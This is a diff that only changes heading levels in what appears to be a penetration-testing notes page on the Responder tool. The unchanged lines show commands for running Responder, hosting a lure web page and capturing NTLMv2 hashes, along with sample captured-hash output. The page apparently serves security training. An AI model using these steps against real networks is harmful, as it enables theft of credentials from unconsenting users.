@@ -77,13 +77,13 @@ Options:
 
 {{%attachments title="Related files" fa_icon_class="far fa-file-video" pattern="responder.mp4"/%}}
 
-#### Analyse mode
+### Analyse mode
 
 ```plain
 sudo ./Responder.py -I <interface> -A -v
 ```
 
-#### Full mode
+### Full mode
 
 ```plain
 sudo ./Responder.py -I <interface> -w -F --lm -v
@@ -106,7 +106,7 @@ Does not work on:
 * Brave (1.5.115, Windows 10)
 * Opera (67.0.3575.115, Windows 10)
 
-#### Index.html content
+### Index.html content
 
 ```plain
 cat index.html
@@ -119,13 +119,13 @@ cat index.html
 </html>
 ```
 
-#### Host the site
+### Host the site
 
 ```plain
 python3 -m http.server 80
 ```
 
-#### Start responder to catch hashes
+### Start responder to catch hashes
 
 ```plain
 responder -I eth0 -A -f -v
@@ -141,11 +141,11 @@ responder -I eth0 -A -f -v
 [+] Listening for events...
 ```
 
-#### Client browsed to site
+### Client browsed to site
 
 ![Example](images/example.png)
 
-#### Hashes aquired
+### Hashes aquired
 
 ```plain
 [SMB] NTLMv2-SSP Client   : 10.10.10.15
@@ -153,7 +153,7 @@ responder -I eth0 -A -f -v
 [SMB] NTLMv2-SSP Hash     : User::WS7-2:2f5d1007fc42a38e:74DF5D8A06BF0059BCCA1AB300782DED:0101000000000000C0653150DE09D2012E16D14827C3AF5500[...]
 ```
 
-#### Find captured hashes
+### Find captured hashes
 
 Folder /logs in the responder folder
 
